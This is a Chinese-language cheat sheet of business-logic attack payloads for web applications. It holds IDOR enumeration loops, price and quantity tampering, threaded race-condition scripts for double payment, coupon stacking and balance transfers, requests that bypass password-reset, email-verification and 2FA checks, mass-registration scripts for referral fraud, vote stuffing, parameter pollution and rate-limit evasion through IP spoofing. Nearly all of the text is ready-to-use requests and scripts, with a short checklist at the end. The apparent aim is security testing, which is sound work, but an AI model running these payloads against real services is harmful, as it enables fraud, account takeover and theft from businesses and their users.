# 业务逻辑漏洞 Payload 模板

## 越权访问 (IDOR)

### 水平越权

```
# 用户 ID 枚举
GET /api/users/1/profile
GET /api/users/2/profile
GET /api/users/3/profile
...

# 订单 ID 枚举
GET /api/orders/1001
GET /api/orders/1002
GET /api/orders/1003
...

# 文件 ID 枚举
GET /api/files/abc123
GET /api/files/abc124
GET /api/files/abc125
...

# UUID 枚举 (虽然更难但仍可能)
GET /api/documents/550e8400-e29b-41d4-a716-446655440000
```

### 垂直越权

```
# 低权限用户尝试高权限操作
# 普通用户尝试管理员操作
POST /api/admin/users
POST /api/admin/config
DELETE /api/admin/users/1

# 修改 role 参数
POST /api/users
{
    "username": "hacker",
    "role": "admin"
}

# 修改 isAdmin 参数
PUT /api/profile
{
    "name": "hacker",
    "isAdmin": true
}
```

### 批量测试脚本

```python
import requests

# ID 枚举
for i in range(1, 1000):
    r = requests.get(f"https://target.com/api/users/{i}", cookies=cookies)
    if r.status_code == 200:
        print(f"[+] Found: {i} - {r.text[:100]}")

# 并发测试
from concurrent.futures import ThreadPoolExecutor

def test_id(user_id):
    r = requests.get(f"https://target.com/api/orders/{user_id}", cookies=cookies)
    if r.status_code == 200:
        return f"{user_id}: {r.json()}"
    return None

with ThreadPoolExecutor(max_workers=10) as executor:
    results = executor.map(test_id, range(1000, 2000))
    for result in results:
        if result:
            print(result)
```

## 支付逻辑漏洞

### 金额篡改

```
# 修改价格参数
POST /api/checkout
{
    "items": [{"id": 1, "price": -100}],
    "total": -100
}

# 修改数量为负数
POST /api/cart
{
    "product_id": 1,
    "quantity": -1
}

# 修改优惠券金额
POST /api/apply-coupon
{
    "coupon": "SAVE10",
    "discount": 999999
}
```

### 优惠券滥用

```
# 同一优惠券多次使用
POST /api/apply-coupon
{"coupon": "ONETIME10"}

# 枚举优惠券码
for code in range(10000, 99999):
    r = requests.post("/api/apply-coupon", json={"coupon": f"SAVE{code}"})
    if "valid" in r.text:
        print(f"[+] Valid: SAVE{code}")

# 绕过使用限制
# 修改请求中的用户标识
POST /api/apply-coupon
{"coupon": "LIMITED1", "user_id": "different_user"}
```

### 订单状态篡改

```
# 修改订单状态
PUT /api/orders/123
{
    "status": "completed",
    "paid": true
}

# 跳过支付步骤
POST /api/orders/123/confirm
{"skip_payment": true}
```

## 条件竞争

### 双重支付

```python
import requests
import threading

def pay():
    requests.post("/api/wallet/pay",
                  json={"order_id": "123", "amount": 100},
                  cookies=cookies)

# 同时发送多个请求
threads = []
for _ in range(10):
    t = threading.Thread(target=pay)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

### 优惠券叠加

```python
import requests
import threading

def apply_coupon():
    r = requests.post("/api/coupon/apply",
                      json={"coupon": "SAVE10"},
                      cookies=cookies)
    print(r.text)

# 同时应用同一优惠券多次
threads = []
for _ in range(20):
    t = threading.Thread(target=apply_coupon)
    threads.append(t)
    t.start()
```

### 余额操作

```python
import requests
import threading

balance_before = 100
transfer_amount = 80

def transfer():
    r = requests.post("/api/transfer",
                      json={"to": "attacker", "amount": transfer_amount},
                      cookies=cookies)
    print(r.text)

# 同时发起多次转账
threads = []
for _ in range(5):
    t = threading.Thread(target=transfer)
    threads.append(t)
    t.start()

for t in threads:
    t.join()

# 检查余额是否异常
```

## 认证绕过

### 密码重置

```
# 枚举重置 token
POST /api/reset-password
{"token": "000000", "password": "newpass"}

# 跳过 token 验证
POST /api/reset-password
{"email": "victim@example.com", "password": "newpass"}

# 修改响应绕过
# 拦截响应，将 "success": false 改为 "success": true

# 使用其他用户的 token
POST /api/reset-password
{"token": "OTHER_USER_TOKEN", "email": "victim@example.com", "password": "newpass"}
```

### 邮箱验证绕过

```
# 修改 email 参数
POST /api/register
{"email": "attacker@attacker.com", "verify_email": "victim@victim.com"}

# 跳过验证步骤
POST /api/verify-email
{"email": "victim@victim.com", "bypass": true}

# 使用他人验证码
POST /api/verify-email
{"email": "victim@victim.com", "code": "123456"}  # 枚举或从其他渠道获取
```

### 2FA 绕过

```
# 跳过 2FA 步骤
POST /api/login/2fa
{"skip": true}

# 使用空或无效 token
POST /api/login/2fa
{"token": ""}

# 重放攻击
POST /api/login/2fa
{"token": "123456"}  # 使用之前有效的 token

# 修改响应
# 拦截响应: {"verified": false} -> {"verified": true}
```

## 批量操作漏洞

### 批量注册

```python
import requests
import random
import string

def generate_email():
    return ''.join(random.choices(string.ascii_lowercase, k=10)) + '@test.com'

for _ in range(1000):
    email = generate_email()
    r = requests.post("/api/register", json={
        "email": email,
        "password": "Test123456",
        "referral_code": "BONUS100"  # 推荐奖励
    })
    if r.status_code == 200:
        print(f"[+] Registered: {email}")
```

### 批量点赞/刷票

```python
import requests

# 使用不同账号
accounts = [("user1", "pass1"), ("user2", "pass2"), ...]

for username, password in accounts:
    # 登录
    r = requests.post("/api/login", json={"username": username, "password": password})
    cookies = r.cookies

    # 点赞
    requests.post("/api/vote", json={"item_id": 123}, cookies=cookies)
```

## 参数污染

### HTTP 参数污染

```
# 多个同名参数
GET /api/user?id=1&id=2
GET /api/transfer?to=attacker&to=victim&amount=100

# 不同框架处理方式不同
# PHP: 使用最后一个参数
# ASP.NET: 使用所有参数（逗号分隔）
# Java: 使用第一个参数
```

### JSON 参数覆盖

```json
{
    "username": "user1",
    "role": "user",
    "role": "admin"
}
```

### 数组注入

```json
{
    "user_id": [1, 2, 3, 4, 5]
}
```

## 状态机漏洞

### 跳过状态

```
# 直接将状态改为最终状态
PUT /api/orders/123
{"status": "completed"}

# 逆向状态变更
PUT /api/orders/123
{"status": "pending"}  # 从 completed 改回 pending

# 重复状态变更
POST /api/orders/123/ship   # 多次发货
POST /api/orders/123/refund  # 未收货退款
```

### 状态枚举

```
# 获取所有可能的状态
OPTIONS /api/orders
GET /api/orders/schema

# 尝试所有状态
for status in ["pending", "processing", "shipped", "delivered", "cancelled", "refunded"]:
    r = requests.put("/api/orders/123", json={"status": status})
    print(f"{status}: {r.status_code}")
```

## 时间/次数限制绕过

### 时间窗口绕过

```python
import requests
import time

# 在时间窗口内多次操作
end_time = time.time() + 60  # 1分钟内
while time.time() < end_time:
    requests.post("/api/bonus", cookies=cookies)
    time.sleep(0.1)  # 避免触发频率限制
```

### 次数限制绕过

```
# 修改客户端计数
X-Requested-With: XMLHttpRequest
X-Forwarded-For: 1.2.3.4  # 伪造 IP

# 使用不同账号
for account in accounts:
    requests.post("/api/limited-action", cookies=account.cookies)

# 重置计数
DELETE /api/counter
```

## 检测清单

```
1. 越权访问 (IDOR)
   - 枚举 ID 参数
   - 修改用户标识
   - 测试权限边界

2. 支付逻辑
   - 金额篡改
   - 优惠券滥用
   - 订单状态修改

3. 条件竞争
   - 并发请求测试
   - 双重支付
   - 资源抢占

4. 认证授权
   - 密码重置流程
   - 邮箱验证绕过
   - 2FA 绕过

5. 批量操作
   - 批量注册
   - 刷票/刷单
   - 推荐奖励滥用

6. 参数污染
   - 同名参数
   - JSON 覆盖
   - 数组注入

7. 状态机
   - 状态跳过
   - 逆向状态
   - 重复操作

8. 限制绕过
   - 时间窗口
   - 次数限制
   - IP 限制
```